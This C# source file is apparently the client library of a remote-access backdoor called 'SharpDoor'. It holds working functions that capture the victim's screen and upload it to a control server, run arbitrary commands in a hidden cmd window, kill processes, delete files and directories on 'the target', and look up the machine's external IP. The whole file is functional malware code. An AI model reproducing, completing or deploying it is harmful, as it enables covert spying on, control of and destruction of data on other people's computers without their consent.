using System;
using System.Net;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Net.Sockets;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using System.Threading;
using System.Security.Cryptography;
namespace SharpDoor_Client
{
    class SupportFuncLib    //Support Function Library for the CLIENT
    {
        public static int Screenshot(NetworkStream stream, TcpClient client)    //Takes screenshot and sends it to server
        {
            Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height); //Create bitmap with size of screen
            using (Graphics g = Graphics.FromImage(bmp))    //Create graphics object from screen
            {
                g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);     //Copy screen to bitmap
            }
            MemoryStream ms = new MemoryStream();   //create new memory stream
            bmp.Save(ms, ImageFormat.Png);  //save image to memory stream
            byte[] bytesToSend = ms.ToArray();   //write bytes of memory stream to an array
            ms.Flush();ms.Close(); //Flush the stream after the bytes are stored and close it
            int bytesSent = 0;int buffer = 4096;
            Program.Send(stream, bytesToSend.Length.ToString());        //Send the length of the file
            Thread.Sleep(100);
            while (bytesSent < bytesToSend.Length)  //Upload loop
            {
                if ((bytesSent + buffer) > bytesToSend.Length)      //Edit buffer if it is larger than possible buffer
                {
                    buffer = bytesToSend.Length - bytesSent;
                }
                stream.Write(bytesToSend, bytesSent, buffer);   //Write data to network stream
                bytesSent += buffer;
            }
            Program.Receive(stream, client);        //Confirm it has been written on server
            return 0;
        } 
        public static string ShellInjection(string command)     //Execute a shell command on target and send the output to the server
        {
            ProcessStartInfo psi = new ProcessStartInfo("cmd");
            psi.UseShellExecute = false;
            psi.RedirectStandardOutput = true;
            psi.RedirectStandardInput = true;
            psi.CreateNoWindow = true;
            var proc = Process.Start(psi);

            proc.StandardInput.WriteLine(@command);
            proc.StandardInput.Flush();
            proc.StandardInput.Close();
            string s = proc.StandardOutput.ReadToEnd();
            return s;
        }
        public static int ChangeDirectory(string path)      //Changes the current working directory of the target
        {
            try
            {
                Directory.SetCurrentDirectory(path);
                return 0;
            }
            catch (DirectoryNotFoundException)  //Exception for if the directory could not be found
            { 
                return 1;
            }
        }
        public static List<int> GetPorts()      //Gather Ports List for the server connection
        {
            int PORT1 = 88;
            int PORT2 = 22;
            int PORT3 = 360;
            int PORT4 = 8000;
            int PORT5 = 8080;
            List<int> PORTS = new List<int>();
            PORTS.Add(PORT1);
            PORTS.Add(PORT2);
            PORTS.Add(PORT3);
            PORTS.Add(PORT4);
            PORTS.Add(PORT5);
            return PORTS;
        }
        public static string GetExternalIpv4()  //Return the external IPV4 of the client
        {
            string externalip = new WebClient().DownloadString("http://icanhazip.com");
            return externalip;
        }
        public static void Shutdown()   //Shutdown the client
        {
            Environment.Exit(0);
        }
        public static int KillProcess(int pid)     //Attempts to kill a process pid on target computer
        {
            Process[] process = Process.GetProcesses();
            foreach (Process prs in process)
            {
                if (prs.Id == pid)
                {
                    prs.Kill();
                    return 0;
                }
            }
            return 1;
        }
        public static int KillProcName(string proc)
        {
            int killed = 0;
            Process[] process = Process.GetProcesses();
            foreach (Process prs in process) 
            {
                if (prs.ProcessName == proc)
                {
                    killed += 1;
                    prs.Kill();
                }
            }
            return killed;
        }
        
        public static int DeleteF(string file)      //Attempt to delete a file or directory off the target
        {
            string root = Directory.GetCurrentDirectory();
            string full_path = @root+"\\"+file;
            if (File.Exists(full_path))
            {
                File.Delete(full_path);
                return 0;
            }
            else if (Directory.Exists(full_path))
            {
                Directory.Delete(full_path);
                return 0;
            }
            else
            {
                return 1;
            }
        }
    }
}
